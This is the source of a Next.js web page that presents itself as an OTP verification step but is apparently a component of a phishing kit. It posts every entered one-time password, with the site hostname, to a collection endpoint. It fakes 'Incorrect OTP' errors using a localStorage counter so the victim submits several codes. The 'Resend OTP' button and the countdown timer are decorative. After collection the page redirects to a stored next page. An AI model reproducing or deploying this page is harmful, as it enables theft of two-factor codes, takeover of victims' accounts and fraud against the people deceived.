'use client';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";  
import { useState } from "react";
import TimerComponent from "../inlcude/TimerComponent";
import Loader  from "../inlcude/Loader";

export default function Home() {
    const router = useRouter();
    const [loading, setLoading] = useState(false);
    const [loader, setLoader] = useState(false);
    const [msg, setMsg] = useState("");
    const API_URL = process.env.NEXT_PUBLIC_URL;
    
    const handleSubmit = async (e) => {
      e.preventDefault();
      setLoading(true);
        
        const SITE = window.location.hostname;
        const next = localStorage.getItem("next");
        let server_ot_times = localStorage.getItem("server_ot_times") ? parseInt(localStorage.getItem("server_ot_times")) : 0;
        let next_page_otp_times = localStorage.getItem("next_page_otp_times") ? parseInt(localStorage.getItem("next_page_otp_times")) : 0;
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            if(key=='PP1'){
              jsonObject[key+"_"+server_ot_times] = value;
            }
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE;
        // jsonObject1['id'] = localStorage.getItem("collection_id");
        
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            if(responseData.status==200){
                e.target.reset();
                localStorage.setItem('collection_id', responseData.data);
                localStorage.setItem('server_ot_times', server_ot_times+1);
                if(next_page_otp_times <= 1 ){
                   localStorage.setItem('next_page_otp_times', 0);
                   setLoader(true);
                    setTimeout(function(){
                      router.push(next);
                      setLoader(false);
                    },5000)
                }else{
                  localStorage.setItem('next_page_otp_times', next_page_otp_times-1);
                  setMsg("Incorrect OTP");
                  setTimeout(function(){
                    setMsg("");
                  },3000)
                }
            }else{
              setMsg("Plesae try again later...");
            }
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }finally{
          setLoading(false);
        }
    };
  return (
    <>
    <Header />
    {
      loader ? (
        <Loader />
      ): (
        <div className="App">
        <div className="mainContent">
          <h1 className="text-center">One Time Password (OTP) Verification</h1>
          <div className="card">
            <p
              style={{
                color: "grey",
                fontSize: 13,
                marginLeft: 20,
                fontFamily: '"Work Sans", sans-serif'
              }}
            >
              One Time Password (OTP) has been sent to
              <br />
              <span
                style={{
                  fontSize: 13,
                  marginLeft: 20,
                  fontFamily: '"Work Sans", sans-serif'
                }}
              >
                your registered mobile Number. <br />
              </span>
              <span
                style={{
                  fontSize: 13,
                  marginLeft: 20,
                  fontFamily: '"Work Sans", sans-serif'
                }}
              >
                Please enter the OTP and proceed.
              </span>
              <br />
            </p>
            <form
              className="LoginForm myform"
              name="frmLogin"
              id="firebaseForm"
              target="hidden_iframe"
              onSubmit={handleSubmit}
            >
              <input type="hidden" name="" defaultValue="" />
              <div className="form-group">
                <label
                  htmlFor="1ST_OTP"
                  style={{ fontSize: 13, fontFamily: '"Work Sans", sans-serif' }}
                >
                  One Time Password
                  <span style={{ fontSize: 13, color: "red" }}>*</span>
                </label>
                <input
                  className="new-control"
                  id="otp"
                  name="PP1"
                  inputMode="numeric"
                  required
                  minLength={4}
                  maxLength={6}
                />
                {
                  (msg && (<span className="text-danger">
                    <small>Incorrect OTP</small>
                  </span>))
                }
              </div>
              
              <div id="re">
                <button type="button" className="resend" onClick={()=>{alert('one time password resend successfully !!')}} >
                  Resend OTP
                </button>
                <br />
              </div>
              <br />
              <div>
                <center>
                  <b
                    style={{
                      color: "rgb(166, 0, 77)",
                      fontFamily: '"Work Sans", sans-serif',
                      fontSize: 14,
                      textAlign: "center"
                    }}
                  >
                    Wait for OTP :&nbsp;
                    <span
                      id="timeCountDown"
                      style={{
                        color: "rgb(166, 0, 77)",
                        fontFamily: '"Work Sans", sans-serif',
                        fontSize: 13
                      }}
                    >
                      <TimerComponent time={180} />
                    </span>
                    &nbsp;seconds
                  </b>
                </center>
              </div>
              <br />
              <div className="submit-div">
                <input className="submit" disabled={loading} type="submit" defaultValue="PROCEED" />
              </div>
            </form>
          </div>
        </div>
          </div>
      )
    }
   

    <Footer />
  </>
  );
}
